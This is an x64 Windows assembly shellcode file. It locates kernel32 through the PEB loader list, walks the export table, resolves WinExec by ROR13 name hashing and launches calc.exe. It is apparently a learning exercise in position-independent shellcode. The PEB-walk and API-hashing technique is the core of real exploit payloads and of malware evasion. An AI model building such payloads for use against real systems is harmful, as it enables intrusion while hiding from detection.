section .text

global _start
_start:
    push rbp
    mov rbp,rsp
    sub rsp,48

    xor r10,r10
    mov r10,gs:[r10+0x60] ;peb address
    mov r10,[r10+0x18] ;ldr address
    mov r10,[r10+0x20] ;InMemoryLoadOrderList
    mov r10,[r10] ;ntdll
    mov r10,[r10] ;kernel32
    mov r10,[r10+0x20]   ;base address of kernel32.dll

    mov ebx,[r10+0x3c];pe
    add rbx,r10
    cmp word[rbx],0x4550 ;compare with PE 
    jne Fail
    mov ebx,[rbx+0x88] ;EXPORT_ADDRESS_TABLE
    add rbx,r10
    
    mov r11d,[rbx+0x18] ;number of functions in kernel32
    mov r12d,[rbx+0x1c] 
    add r12,r10 ;address of functions
    mov r13d,[rbx+0x20]
    add r13,r10 ;address of names
    mov r14d,[rbx+0x24]
    add r14,r10 ;address of name ordinals
    
    xor rcx,rcx
Find_string:
    cmp rcx,r11;check if the loop reaches end of the function names
    jge Fail
    mov r15d,[r13+rcx*4];walk through the names array
    add r15,r10
    mov rsi,r15;move the string name inorder to harsh it
    mov r8,rcx ;store value in rcx so that we will not loose it after hashing function
    call Hash_string
    mov rcx,r8;recover it
    inc rcx
    cmp rax,0x5fc6a1d1 ;compare generated hash with a hash of function we want
    jne Find_string
    xor rdi,rdi
    dec rcx
    movzx rax,word[r14+rcx*2];we do zero extension...-array of names ordinals
    mov edi,[r12+rax*4];array or functions
    add rdi,r10;Absolute address of the functio we were finding,ie,WinExec
    mov dword[rbp-0x10],"calc" 
    mov word[rbp-0x0c],0x00 ;null terminator
    lea rcx,[rbp-0x10];first argument of WinExec
    xor rdx,rdx
    inc rdx ;2nd argument 
    call rdi;call WinExec Function
    jmp exit ;Jump to cleaning function


Hash_string:
    push rbp
    mov rbp,rsp
    sub rsp,48
    xor rcx,rcx
    xor rax,rax
    xor rdi,rdi
    mov rcx,6 ;Length of the string to be hashed
    cld ;we clear the direction flag
loop:
    lodsb ;loads byte from rsi to rax
    ror edi,13 ;we now execute ROR13 hashing algorithm
    add edi,eax
    dec rcx 
    cmp rcx,0
    jne loop
    mov rax,rdi
    mov rsp,rbp
    pop rbp
    ret

Fail:
   xor rax,rax
   dec rax
   jmp exit


exit:
   mov rsp,rbp
   pop rbp
   ret 
    
    
    
    
